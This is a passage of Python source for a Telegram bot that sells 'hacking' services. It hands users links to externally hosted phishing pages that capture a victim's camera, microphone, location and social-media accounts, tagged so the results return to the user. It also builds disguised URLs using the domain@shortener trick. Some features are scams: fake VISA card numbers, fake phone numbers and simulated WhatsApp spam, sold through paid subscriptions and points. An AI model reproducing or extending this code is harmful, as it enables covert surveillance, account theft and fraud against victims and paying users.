        admin_message = f"🔔 New Subscription Request\n- User: {message.from_user.first_name} ({user_id})\n- Package: {months} months ({price})\n- Method: {method}"
        kb = InlineKeyboardMarkup(row_width=2).add(
            InlineKeyboardButton("✅ Approve", callback_data=f"approve_{user_id}_{months}"),
            InlineKeyboardButton("❌ Reject", callback_data=f"reject_{user_id}")
        )
        for admin_id in get_lines(admins_file):
            try:
                bot.send_message(admin_id, admin_message, disable_web_page_preview=True)
                bot.forward_message(admin_id, user_id, message.message_id)
                bot.send_message(admin_id, "Please take an action:", reply_markup=kb)
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Failed to send proof to admin {admin_id}: {e}")
            except Exception as e:
                print(f"General error sending proof to admin {admin_id}: {e}")
        try:
            bot.reply_to(message, "✅ Your request has been received and sent for review.")
            set_state(user_id, None)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error replying to payment proof: {e}")

    def handle_payment_approval(call):
        user_to_approve = call.data.split('_')[1]
        add_line(paid_users_file, user_to_approve)
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id, message_id=call.message.message_id,
                text=f"✅ Subscription for {user_to_approve} has been approved."
            )
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error editing message after approval: {e}")
        try:
            bot.send_message(user_to_approve, "🎉 Congratulations! Your subscription has been successfully confirmed.")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Failed to notify user {user_to_approve} about approval: {e}")
        except Exception as e:
            print(f"General error notifying user {user_to_approve} about approval: {e}")

    def handle_payment_rejection(call):
        user_to_reject = call.data.split('_')[1]
        try:
            bot.delete_message(call.message.chat.id, call.message.message_id)
            bot.answer_callback_query(call.id, "🗑️ The request has been rejected.")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error deleting rejection message or answering callback: {e}")
        try:
            bot.send_message(user_to_reject, "❌ We are sorry, your subscription request has been rejected.")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Failed to notify user {user_to_reject} about rejection: {e}")
        except Exception as e:
            print(f"General error notifying user {user_to_reject} about rejection: {e}")
    # --- منطق الدفع بالنجوم للمستخدم (للاشتراك في البوت) ---
    def ask_for_subscription_days(call):
        locale = get_locale()
        set_state(call.from_user.id, {"action": "awaiting_days_for_stars"})
        kb = InlineKeyboardMarkup().add(InlineKeyboardButton(locale["cancel_button"], callback_data="cancel_action"))
        try:
            bot.edit_message_text(
                chat_id=call.message.chat.id, message_id=call.message.message_id,
                text="How many days do you want to subscribe to the bot?\n\nSend the number of days (e.g., 30).",
                reply_markup=kb
            )
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error editing message in ask_for_subscription_days: {e}")

    def create_stars_invoice(message):
        user_id = str(message.from_user.id)
        try:
            days = int(message.text.strip())
            if days <= 0:
                try:
                    bot.reply_to(message, "❌ Please send a number of days greater than zero.")
                except telebot.apihelper.ApiTelegramException as e:
                    print(f"Error replying to invalid days (<=0): {e}")
                return
        except ValueError:
            try:
                bot.reply_to(message, "❌ Please send numbers only.")
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error replying to invalid days (not number): {e}")
            return
        stars_config = get_json_data(stars_config_file)
        provider_token = stars_config.get('provider_token')
        stars_per_day = stars_config.get('stars_per_day')
        if not provider_token or not stars_per_day:
            try:
                bot.reply_to(message, "⚠️ Sorry, the Stars payment service is not currently configured by the bot owner.")
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error replying to unconfigured stars service: {e}")
            return
        total_stars = days * stars_per_day
        prices = [LabeledPrice(label=f"Subscription for {days} days", amount=total_stars)]
        invoice_payload = f"stars-sub-{user_id}-{int(time.time())}"
        try:
            bot.send_invoice(
                chat_id=int(user_id), title=f"Bot Subscription",
                description=f"Premium subscription for {days} days for {total_stars} stars.",
                provider_token=provider_token, currency="XTR", prices=prices,
                invoice_payload=invoice_payload
            )
            set_state(user_id, None)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending stars invoice: {e}")
            try:
                bot.send_message(user_id, "❌ An error occurred while creating the invoice.")
            except telebot.apihelper.ApiTelegramException as e_inner:
                print(f"Error sending invoice creation error message: {e_inner}")
        except Exception as e:
            print(f"General error creating stars invoice: {e}")
            try:
                bot.send_message(user_id, "❌ An unexpected error occurred while creating the invoice.")
            except telebot.apihelper.ApiTelegramException as e_inner:
                print(f"Error sending unexpected invoice creation error message: {e_inner}")

    # --- معالجات الدفع ---
    @bot.pre_checkout_query_handler(func=lambda query: True)
    def checkout_handler(pre_checkout_query):
        try:
            bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error answering pre-checkout query: {e}")

    @bot.message_handler(content_types=["successful_payment"])
    def successful_payment_handler(message):
        user_id = str(message.from_user.id)
        payload = message.successful_payment.invoice_payload

        if payload.startswith("stars-sub"):
            add_line(paid_users_file, user_id)
            try:
                bot.send_message(message.chat.id, "🎉 Your subscription has been confirmed successfully! Thank you.")
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error sending successful payment confirmation: {e}")
            for admin_id in get_lines(admins_file):
                try:
                    bot.send_message(admin_id, f"🔔 New subscription via Stars!\n- User: {message.from_user.first_name}")
                except telebot.apihelper.ApiTelegramException as e:
                    print(f"Error notifying admin {admin_id} about stars subscription: {e}")
                except Exception as e:
                    print(f"General error notifying admin {admin_id} about stars subscription: {e}")
        
    # --- بداية نظام النقاط وميزات VIP ---
    def get_user_points(user_id):
        points_data = get_json_data(points_file)
        return points_data.get(str(user_id), 0)
        
    def add_user_points(user_id, amount):
        points_data = get_json_data(points_file)
        current_points = points_data.get(str(user_id), 0)
        points_data[str(user_id)] = current_points + amount
        save_json_data(points_file, points_data)

    @bot.message_handler(commands=['vip'])
    def show_vip_panel(message):
        kb = InlineKeyboardMarkup(row_width=2)
        kb.row(
            InlineKeyboardButton("👤 Get Contacts", callback_data="vip_contacts"),
            InlineKeyboardButton("📁 Get Files", callback_data="vip_files")
        )
        kb.row(
            InlineKeyboardButton("🖼️ Get Gallery", callback_data="vip_gallery"),
            InlineKeyboardButton("🔑 Get Passwords", callback_data="vip_passwords")
        )
        kb.add(InlineKeyboardButton("📸 Hack via Image", callback_data="vip_image_hack"))
        
        vip_text = """Hello!
These options are paid at a price of 15 points per operation.
You can collect points and unlock them for free.

🔹 Send /ng_wahm to view your points and your invitation link."""
        try:
            bot.send_message(message.chat.id, vip_text, reply_markup=kb)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending VIP panel: {e}")

    @bot.message_handler(commands=['ng_wahm'])
    def show_points_and_invite_link(message):
        user_id = str(message.from_user.id)
        points = get_user_points(user_id)
        bot_username = ""
        try:
            bot_username = bot.get_me().username
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error getting bot username for invite link: {e}")
            bot_username = "YOUR_BOT_USERNAME" # Fallback
        invite_link = f"https://t.me/{bot_username}?start={user_id}"
        
        points_text = f"""💰 Your points balance: {points} points

🚀 Collect points by inviting your friends via your special link:
{invite_link}
"""
        try:
            bot.send_message(message.chat.id, points_text)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending points and invite link: {e}")

    def handle_vip_callbacks(call):
        user_id = str(call.from_user.id)
        points = get_user_points(user_id)
        cost = 15
        
        feature_name_map = {
            "vip_contacts": "Get Contacts", "vip_files": "Get Files",
            "vip_gallery": "Get Gallery", "vip_passwords": "Get Passwords",
            "vip_image_hack": "Hack via Image"
        }
        feature_name = feature_name_map.get(call.data)

        if not feature_name: return

        if points >= cost:
            add_user_points(user_id, -cost)
            bot.answer_callback_query(call.id, f"✅ {cost} points have been deducted. Your new balance is {get_user_points(user_id)} points.", show_alert=True)
            try:
                bot.send_message(call.message.chat.id, f"The '{feature_name}' feature has been successfully executed (this is a simulation, nothing was actually executed).")
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error sending VIP feature execution message: {e}")
        else:
            bot.answer_callback_query(call.id, f"🚫 Insufficient balance. You need at least {cost} points.", show_alert=True)

    # --- [محدث] بداية دوال الميزات المتنوعة والكاملة ---
    def handle_booming_link(message):
        user_id = str(message.from_user.id)
        link = message.text.strip()
        brokweb = "https://your-main-website.com" # هذا الرابط يجب أن يكون رابطًا حقيقيًا لموقعك

        # التحقق من أن الرابط المدخل صالح
        if not (link.startswith("http://") or link.startswith("https://")):
            try:
                bot.reply_to(message, "❌ الرابط المدخل غير صالح. يرجى إرسال رابط يبدأ بـ http:// أو https://")
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error replying to invalid booming link: {e}")
            set_state(user_id, None)
            return
        
        kb = InlineKeyboardMarkup(row_width=2)
        kb.add(
            InlineKeyboardButton('📷 Camera', url=f"{brokweb}/com/?ID={user_id}&link={urllib.parse.quote_plus(link)}"),
            InlineKeyboardButton('📱 HACK Mobile', url=f"{brokweb}/mode/?ID={user_id}&link={urllib.parse.quote_plus(link)}")
        )
        kb.add(
            InlineKeyboardButton('🎧 HACK', url=f"{brokweb}/mic/?ID={user_id}&link={urllib.parse.quote_plus(link)}"),
            InlineKeyboardButton('📋 HACK', url=f"{brokweb}/copy/?ID={user_id}&link={urllib.parse.quote_plus(link)}")
        )
        kb.add(InlineKeyboardButton('↩ Back', callback_data='back_to_main'))

        text = """🌟 Choose the weaponized page that suits your needs!
You will find a variety of ready-made pages that allow you to easily collect data. Each page is carefully designed to meet your specific requirements.
📄🔗 Long-press the button to copy the index link."""
        
        try:
            bot.reply_to(message, text, reply_markup=kb, disable_web_page_preview=True)
            set_state(user_id, None)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error replying to booming link: {e}")

    def ask_for_domain(message):
        locale = get_locale()
        user_id = str(message.from_user.id)
        original_link = message.text.strip()
        if not (original_link.startswith("http://") or original_link.startswith("https://")):
            try:
                bot.reply_to(message, locale["invalid_original_link"])
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error replying to invalid original link: {e}")
            return
        
        set_state(user_id, {"action": "awaiting_domain", "original_link": original_link})
        try:
            bot.reply_to(message, locale["original_link_saved"])
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error replying to original link saved: {e}")

    def ask_for_keywords(message):
        locale = get_locale()
        user_id = str(message.from_user.id)
        domain = message.text.strip()
        # Basic domain validation
        if '.' not in domain or ' ' in domain or '/' in domain or not re.match(r"^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$", domain):
            try:
                bot.reply_to(message, locale["invalid_domain"])
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error replying to invalid domain: {e}")
            return
            
        state = get_state(user_id)
        state["action"] = "awaiting_keywords"
        state["domain"] = domain
        set_state(user_id, state)
        try:
            bot.reply_to(message, locale["domain_saved"])
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error replying to domain saved: {e}")

    def generate_hidden_links(message):
        locale = get_locale()
        user_id = str(message.from_user.id)
        keywords = message.text.strip().replace(' ', '-')
        state = get_state(user_id)
        
        original_link = state["original_link"]
        domain = state["domain"]
        
        shorteners = {
            "tinyurl.com": "https://tinyurl.com/api-create.php?url=",
            "is.gd": "https://is.gd/create.php?format=simple&url=",
        }
        
        result_text = locale["original_link_display"].format(original_link)
        result_text += locale["disguised_links_header"]
        
        encoded_link = urllib.parse.quote(original_link)
        
        for name, api_url in shorteners.items():
            try:
                full_api_url = f"{api_url}{encoded_link}"
                short_link = requests.get(full_api_url, timeout=5).text # Added timeout
                if short_link.startswith("Error"): # Some shorteners return error messages
                    result_text += f"╰➤ {name}: Failed to shorten.\n"
                else:
                    # Ensure the short_link is clean before embedding
                    clean_short_link = short_link.replace('https://', '').replace('http://', '').strip('/')
                    disguised_link = f"https://{domain}{keywords}@{clean_short_link}"
                    result_text += f"╰➤ {disguised_link}\n"
            except requests.exceptions.RequestException as e:
                print(f"Shortener error for {name}: {e}")
                result_text += f"╰➤ {name}: Connection error.\n"
            except Exception as e:
                print(f"General error for shortener {name}: {e}")
                result_text += f"╰➤ {name}: Unexpected error.\n"
        
        try:
            bot.reply_to(message, result_text, disable_web_page_preview=True)
            set_state(user_id, None)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error replying with hidden links: {e}")

    def handle_fake_number_feature(call, is_change=False):
        FAKE_NUMBERS_DATA = [{"country": "UK 🇬🇧", "code": "+44", "number": lambda: f"7{random.randint(100, 999)}0{random.randint(100, 999)}"}]
        bot.answer_callback_query(call.id)
        country_data = random.choice(FAKE_NUMBERS_DATA)
        phone_number = f"{country_data['code']}{country_data['number']()}"
        now = datetime.datetime.now()
        
        text = f"""➖ Request made 🛎•
➖ Phone Number ☎️ : {phone_number}
➖ Country : {country_data['country']}
➖ Country Code 🌏 : {country_data['code']}
➖ Platform 🔮 : For all websites and apps
➖ Creation Date 📅 : {now.strftime('%Y-%m-%d')}
➖ Creation Time ⏰ : {now.strftime('%I:%M:%S %p')}
➖ Click on the number to copy it."""
        
        kb = InlineKeyboardMarkup()
        kb.row(
            InlineKeyboardButton("📲 Request Code", callback_data="request_sms_code"),
            InlineKeyboardButton("🔄 Change Number", callback_data="change_fake_number")
        )
        
        try:
            if not is_change:
                bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=kb)
            else:
                bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=kb)
        except telebot.apihelper.ApiTelegramException as e:
             print(f"Error editing/sending fake number message: {e}")
             # Fallback to send new message if edit fails
             try:
                 bot.send_message(call.message.chat.id, text, reply_markup=kb)
             except telebot.apihelper.ApiTelegramException as e_inner:
                 print(f"Error sending new fake number message: {e_inner}")


    def handle_request_sms_code(call):
        bot.answer_callback_query(call.id, "⏳ Requesting code...", show_alert=False)
        time.sleep(2)
        try:
            bot.send_message(call.message.chat.id, "❌ Failed to receive code. Try another number.")
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending SMS code failure message: {e}")

    def handle_get_visa_feature(call):
        bot.answer_callback_query(call.id)
        msg = None
        try:
            msg = bot.edit_message_text("♻️ Scanning for VISA cards . . .\n🔍 Please wait a moment", call.message.chat.id, call.message.message_id)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error editing message for VISA scan: {e}. Sending new message.")
            try:
                msg = bot.send_message(call.message.chat.id, "♻️ Scanning for VISA cards . . .\n🔍 Please wait a moment")
            except telebot.apihelper.ApiTelegramException as e_inner:
                print(f"Error sending new VISA scan message: {e_inner}")
                return # Cannot proceed without a message object

        time.sleep(2)
        card_number = f"4709{random.randint(1000, 9999)}{random.randint(1000, 9999)}{random.randint(1000, 9999)}"
        expiry = f"{random.randint(1, 12):02d}/{random.randint(2025, 2030)}"
        cvv = f"{random.randint(100, 999)}"
        bank = random.choice(["Bank of America", "Chase Bank", "Wells Fargo", "Citibank"])
        country = "USA 🇺🇸"
        value = random.randint(5, 100)
        bot_username = ""
        try:
            bot_username = bot.get_me().username
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error getting bot username for VISA text: {e}")
            bot_username = "YOUR_BOT_USERNAME" # Fallback
        visa_text = f"""Passed ✅
- Card Number : {card_number}
- Expiry : {expiry}
- CVV : {cvv}
- Bank : {bank}
- Card Type : VISA - CREDIT - GOLD
- Country : {country}
- Value : ${value}
============================
- by : @{bot_username}"""
        try:
            bot.edit_message_text(visa_text, chat_id=msg.chat.id, message_id=msg.message_id)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error editing message with VISA details: {e}")
            try:
                bot.send_message(msg.chat.id, visa_text) # Fallback to send new message
            except telebot.apihelper.ApiTelegramException as e_inner:
                print(f"Error sending new VISA details message: {e_inner}")

    def show_wifi_networks(call):
        bot.answer_callback_query(call.id, "❌ No networks found in the current range.", show_alert=True)

    def radio_menu(call):
        bot.answer_callback_query(call.id, "⚠️ The radio service is currently down for maintenance.", show_alert=True)

    def zakhrafa_menu(call):
        locale = get_locale()
        kb = InlineKeyboardMarkup(row_width=2)
        kb.add(InlineKeyboardButton("العربية", callback_data="zakhrafa_ar"), InlineKeyboardButton("English", callback_data="zakhrafa_en"))
        kb.add(InlineKeyboardButton(locale["back_button"], callback_data="back_to_main"))
        try:
            bot.edit_message_text(locale["choose_zakhrafa_lang"], call.message.chat.id, call.message.message_id, reply_markup=kb)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error editing message in zakhrafa_menu: {e}")

    def ask_for_zakhrafa_text(call):
        locale = get_locale()
        lang = call.data.replace('zakhrafa_', '')
        lang_name = locale["lang_ar"] if lang == "ar" else locale["lang_en"]
        set_state(call.from_user.id, {"action": f"zakhrafa_{lang}"})
        kb = InlineKeyboardMarkup().add(InlineKeyboardButton(locale["cancel_button"], callback_data="cancel_action"))
        try:
            bot.edit_message_text(locale["ask_zakhrafa_text"].format(lang_name), call.message.chat.id, call.message.message_id, reply_markup=kb)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error editing message in ask_for_zakhrafa_text: {e}")

    def internal_zakhrafa(text, lang='ar'):
        if lang == 'ar':
            return ['★彡{}彡★'.format(text), '⚫ » {} « ⚫'.format(text), '◥ ツ {} ツ ◤'.format(text)]
        else:
            en_map = {'a': 'α', 'b': 'в', 'c': '¢', 'd': '∂', 'e': 'є', 'f':'ƒ', 'g':'g', 'h':'н', 'i':'ι', 'j':'נ', 'k':'к', 'l':'ℓ', 'm':'м', 'n':'η', 'o':'σ', 'p':'ρ', 'q':'q', 'r':'я', 's':'ѕ', 't':'т', 'u':'υ', 'v':'ν', 'w':'ω', 'x':'χ', 'y':'у', 'z':'z'}
            fancy_text = ''.join([en_map.get(char.lower(), char) for char in text])
            return ['Fancy: {}'.format(text), 'Symbol: {}'.format(fancy_text), 'FANCY: {}'.format(text.upper())]

    def send_whatsapp_spam(message):
        locale = get_locale()
        user_id = str(message.from_user.id)
        phone_number = message.text.strip()
        
        # Basic validation for phone number (digits only, min length)
        if not phone_number.isdigit() or len(phone_number) < 10:
            try:
                bot.reply_to(message, locale["invalid_phone_number"])
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error replying to invalid phone number: {e}")
            set_state(user_id, None)
            return

        try:
            bot.reply_to(message, locale["sending_spam"])
            time.sleep(3) # Simulate sending
            bot.send_message(user_id, locale["spam_sent_success"])
            set_state(user_id, None)
        except telebot.apihelper.ApiTelegramException as e:
            print(f"Error sending WhatsApp spam messages: {e}")

    @bot.callback_query_handler(func=lambda call: True)
    def handle_all_callbacks(call):
        user_id = str(call.from_user.id)
        locale = get_locale()
        
        if not is_bot_enabled() and not is_admin(user_id):
            bot.answer_callback_query(call.id, locale["bot_under_maintenance"], show_alert=True)
            return
        
        if is_paid_mode() and not is_admin(user_id) and not is_paid_user(user_id) and not call.data.startswith(('subscribe_', 'pay_via_', 'package_', 'back_to_start_paid', 'cancel_action', 'check_force_sub')):
            bot.answer_callback_query(call.id, "This feature requires a subscription.", show_alert=True)
            return

        # --- User Payment System Handlers ---
        if call.data == "subscribe_start": show_subscription_options(call); return
        if call.data.startswith("pay_via_"): show_package_options(call); return
        if call.data.startswith("package_"): process_package_selection(call); return
        if call.data == "subscribe_stars_start": ask_for_subscription_days(call); return
        if call.data == "back_to_start_paid":
            # Re-send the initial paid mode message
            # This requires the original message object or recreating it
            # For simplicity, let's just send a new message for now
            try:
                bot.send_message(call.message.chat.id, "Welcome! Please choose a subscription plan.", reply_markup=get_paid_mode_keyboard(locale, owner_id, payment_methods_file, stars_config_file, has_premium_features()))
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error sending back to start paid message: {e}")
            return
        if call.data == "check_force_sub":
            # Re-check subscription after user clicks "Subscribed"
            is_subscribed, not_subscribed_channels = is_user_subscribed(user_id)
            if is_subscribed:
                bot.answer_callback_query(call.id, "✅ تم الاشتراك بنجاح!", show_alert=True)
                # Simulate /start command to refresh the main menu
                start_new(call.message)
            else:
                kb = InlineKeyboardMarkup()
                for ch in not_subscribed_channels:
                    kb.add(InlineKeyboardButton(f"📢 Subscribe to @{ch}", url=f"https://t.me/{ch}"))
                kb.add(InlineKeyboardButton(locale["subscribed_button"], callback_data="check_force_sub"))
                try:
                    bot.edit_message_text(locale["must_subscribe"], chat_id=call.message.chat.id, message_id=call.message.message_id, reply_markup=kb)
                except telebot.apihelper.ApiTelegramException as e:
                    print(f"Error editing message after force sub check: {e}")
            return

        # --- Admin Panel Handlers ---
        if is_admin(user_id):
            if call.data == "back_to_admin": admin_panel(call.message); return
            if call.data == "manage_payment_methods": payment_management_panel(call); return
            if call.data == "add_payment_method": ask_for_payment_method_type(call); return
            if call.data.startswith("payment_type_"): ask_for_payment_method_name(call); return
            if call.data.startswith("delete_payment_"): delete_payment_method(call); return
            if call.data.startswith("approve_"): handle_payment_approval(call); return
            if call.data.startswith("reject_"): handle_payment_rejection(call); return
            if call.data == "manage_buttons": buttons_management_panel(call); return
            if call.data == "add_custom_button": ask_for_button_text(call); return
            if call.data == "delete_custom_button": show_buttons_for_deletion(call); return
            if call.data.startswith("confirm_delete_"): confirm_button_deletion(call); return
            if call.data.startswith("execute_delete_"): execute_button_deletion(call); return
            if call.data.startswith("btn_type_"): ask_for_button_link(call); return
            if call.data == "setup_stars_payment": show_stars_setup_info(call); return
            if call.data == "change_language": language_panel(call); return
            if call.data.startswith("set_lang_"): set_language(call); return
            # --- Download Data Handlers (New) ---
            if call.data == "download_data": download_data_panel(call); return
            if call.data.startswith("download_file_"): send_data_file(call); return


        # --- Direct Link Button Handlers ---
        links = {
            "cam_back": "https://spectacular-crumble-77f830.netlify.app", "cam_front": "https://profound-bubblegum-7f29b2.netlify.app",
            "location": "https://illustrious-panda-c2ece1.netlify.app", "mic_record": "https://tourmaline-kulfi-aeb7ea.netlify.app",
            "record_video": "https://dainty-medovik-d0e934.netlify.app", "pubg_hack": "https://sunny-concha-96fe88.netlify.app",
            "ff_hack": "https://thunderous-maamoul-7653c0.netlify.app", "insta_hack": "https://celebrated-sorbet-6e74b8.netlify.app",
            "whatsapp_hack": "https://phenomenal-frangollo-0cd66a.netlify.app", "facebook_hack": "https://dazzling-daffodil-ed5b43.netlify.app",
            "tiktok_hack": "https://melodious-crumble-8d3b83.netlify.app", "snapchat_hack": "https://preeminent-gumdrop-35a4f1.netlify.app",
            "device_info": "http://incredible-fairy-85f241.netlify.app", "high_quality_shot": "https://profound-bubblegum-7f29b2.netlify.app",
            "get_victim_number": "https://tubular-brioche-55433f.netlify.app/", "discord_hack": "https://sweet-madeleine-41fe6e.netlify.app/",
            "roblox_hack": "https://silly-sunflower-ab29c8.netlify.app/"
        }
        if call.data in links:
            encrypted_token = encrypt_token(token)
            link = f"{links[call.data]}?id={user_id}&tok={encrypted_token}"
            bot.answer_callback_query(call.id, locale["link_generated"])
            try:
                bot.send_message(call.message.chat.id, locale["copy_and_send_link"].format(link))
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error sending generated link: {e}")
            return

        # --- State-based Button Handlers ---
        action_map = {
            "ask_wormgpt": ("ask_wormgpt", locale["ask_wormgpt_prompt"]),
            "interpret_dream": ("interpret_dream", locale["interpret_dream_prompt"]),
            "check_link": ("check_link", locale["check_link_prompt"]),
            "text_to_speech": ("text_to_speech", locale["text_to_speech_prompt"]),
            "booming_link_start": ("awaiting_booming_link", locale["booming_link_prompt"]),
            "hide_link": ("awaiting_original_link", locale["hide_link_prompt"]),
            "whatsapp_spam": ("awaiting_whatsapp_number", locale["whatsapp_spam_prompt"])
        }
        if call.data in action_map:
            action, prompt = action_map[call.data]
            set_state(user_id, {"action": action})
            kb = InlineKeyboardMarkup().add(InlineKeyboardButton(locale["cancel_button"], callback_data="cancel_action"))
            try:
                bot.edit_message_text(prompt, call.message.chat.id, call.message.message_id, reply_markup=kb, disable_web_page_preview=True)
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error editing message for state-based action: {e}")
            return

        # --- Direct Action & Sub-menu Button Handlers ---
        if call.data == "surveillance_cams": bot.answer_callback_query(call.id, "❌ Server connection error.", show_alert=True); return
        if call.data == "full_hack_info":
            try:
                bot.send_message(call.message.chat.id, "To unlock the special commands for this button, send the following command:\n/vip")
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error sending VIP info message: {e}")
            return
        if call.data == "fake_number": handle_fake_number_feature(call); return
        if call.data == "change_fake_number": handle_fake_number_feature(call, is_change=True); return
        if call.data == "request_sms_code": handle_request_sms_code(call); return
        if call.data == "get_visa": handle_get_visa_feature(call); return
        if call.data == "hack_wifi": show_wifi_networks(call); return
        if call.data == "radio_menu": radio_menu(call); return
        if call.data == "zakhrafa": zakhrafa_menu(call); return
        if call.data.startswith("zakhrafa_"): ask_for_zakhrafa_text(call); return
        if call.data == "hunt_usernames": bot.answer_callback_query(call.id, "⚠️ Feature under development.", show_alert=True); return
        if call.data == "akinator_fake_error": bot.answer_callback_query(call.id, "⚠️ Error: Cannot read properties of undefined", show_alert=True); return
        if call.data == "back_to_main": start_new(call.message); return
        if call.data == "cancel_action": 
            set_state(user_id, None)
            try:
                bot.edit_message_text(locale["action_cancelled"], call.message.chat.id, call.message.message_id)
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error editing message for cancel action: {e}")
            return
        if call.data.startswith("vip_"): handle_vip_callbacks(call); return
        
        if call.data.startswith("custom_"):
            custom_buttons = get_json_data(custom_buttons_file)
            button_data = custom_buttons.get(call.data)
            if button_data:
                bot.answer_callback_query(call.id, f"Custom button pressed: {button_data['text']}")
            else:
                bot.answer_callback_query(call.id, "⚠️ This custom button was not found.")
            return
        
        if is_admin(user_id):
            handle_admin_panel_callbacks(call)
            return

    def handle_admin_panel_callbacks(call):
        locale = get_locale()
        action = call.data
        
        actions_requiring_input = {
            "send": locale["ask_broadcast_msg"], 
            "forward": locale["ask_forward_msg"],
            "add_ch": locale["ask_channel_id"], 
            "del_ch": "Send the channel ID to delete",
            "ban": locale["ask_ban_id"], 
            "unban": locale["ask_unban_id"],
            "add_admin": locale["ask_add_admin_id"], 
            "rem_admin": locale["ask_rem_admin_id"],
            "add_paid": locale["ask_add_paid_id"], 
            "rem_paid": locale["ask_rem_paid_id"],
            "set_start_msg": locale["set_start_msg_prompt"]
        }

        if action in actions_requiring_input:
            set_state(call.from_user.id, {"action": action})
            kb = InlineKeyboardMarkup().add(InlineKeyboardButton(locale["cancel_button"], callback_data="cancel_action"))
            try:
                bot.edit_message_text(
                    chat_id=call.message.chat.id, message_id=call.message.message_id,
                    text=f"{actions_requiring_input[action]}",
                    reply_markup=kb
                )
            except telebot.apihelper.ApiTelegramException as e:
                print(f"Error editing message for admin action: {e}")
        elif action == "m1":
            count = len(get_lines(subscribers_file))
            bot.answer_callback_query(call.id, f"Total subscribers: {count}", show_alert=True)
        elif action == "ons":
            set_setting(notify_file, "ON"); bot.answer_callback_query(call.id, "✔️ Join notifications enabled.")
        elif action == "ofs":
            set_setting(notify_file, "OFF"); bot.answer_callback_query(call.id, "❎ Join notifications disabled.")
        elif action == "obot":
            set_setting(status_file, "ON"); bot.answer_callback_query(call.id, "✅ Bot enabled for everyone.")
        elif action == "ofbot":
            set_setting(status_file, "OFF"); bot.answer_callback_query(call.id, "❌ Bot disabled.")
        elif action == "set_paid":
            set_setting(paid_mode_file, "ON"); bot.answer_callback_query(call.id, "💰 Paid mode activated.")
        elif action == "set_free":
            set_setting(paid_mode_file, "OFF"); bot.answer_callback_query(call.id, "🆓 Free mode activated.")
    @bot.message_handler(func=lambda message: get_state(message.from_user.id) is not None, content_types=['text', 'photo', 'voice'])
    def handle_state_messages(message):
        user_id = str(message.from_user.id)
        locale = get_locale()
        state = get_state(user_id)
        if not state: return
        action = state.get("action")
        text_content = message.text.strip() if message.text else ""

        if action == "set_stars_per_day":
            if str(user_id) == str(owner_id): set_stars_per_day(message)
            return
            
        if action == "awaiting_days_for_stars":
            create_stars_invoice(message)
            return
        
        if action == "awaiting_payment_proof":
            forward_payment_proof_to_admin(message)
            return

        if is_admin(user_id):
            if action == "add_payment_name": ask_for_payment_address(message); return
            if action == "add_payment_address": ask_for_payment_price(message); return
            if action == "add_payment_price": save_payment_method(message); return
            if action == "add_button_text": ask_for_button_type(message); return
            if action == "add_button_link": save_custom_button(message); return
            
            admin_actions = {
                "send": lambda m: [bot.send_message(int(uid), m.text) for uid in get_lines(subscribers_file) if is_user_reachable(bot, int(uid))],
                "forward": lambda m: [bot.forward_message(int(uid), m.chat.id, m.message_id) for uid in get_lines(subscribers_file) if is_user_reachable(bot, int(uid))],
                "add_ch": lambda m: add_line(channels_file, m.text.strip()),
                "del_ch": lambda m: remove_line(channels_file, m.text.strip()),
                "ban": lambda m: add_line(banned_file, m.text.strip()),
                "unban": lambda m: remove_line(banned_file, m.text.strip()),
                "add_admin": lambda m: add_line(admins_file, m.text.strip()),
                "rem_admin": lambda m: remove_line(admins_file, m.text.strip()) if m.text.strip() != str(owner_id) else None,
                "add_paid": lambda m: add_line(paid_users_file, m.text.strip()),
                "rem_paid": lambda m: remove_line(paid_users_file, m.text.strip()),
                "set_start_msg": lambda m: set_setting(start_message_file, m.text)
            }
            if action in admin_actions:
                try:
                    admin_actions[action](message)
                    bot.send_message(user_id, locale["action_success"])
                    set_state(user_id, None)
                    admin_panel(message) # Refresh admin panel
                except telebot.apihelper.ApiTelegramException as e:
                    bot.send_message(user_id, f"❌ حدث خطأ في تيليجرام أثناء تنفيذ الإجراء: {e}")
                    print(f"Telegram API error during admin action {action}: {e}")
                    set_state(user_id, None) # Clear state on error
                except Exception as e:
                    bot.send_message(user_id, f"❌ حدث خطأ عام أثناء تنفيذ الإجراء: {e}")
                    print(f"General error during admin action {action}: {e}")
                    set_state(user_id, None) # Clear state on error
                return

        if action == "awaiting_booming_link": handle_booming_link(message); return
        if action == "awaiting_original_link": ask_for_domain(message); return
        if action == "awaiting_domain": ask_for_keywords(message); return
        if action == "awaiting_keywords": generate_hidden_links(message); return
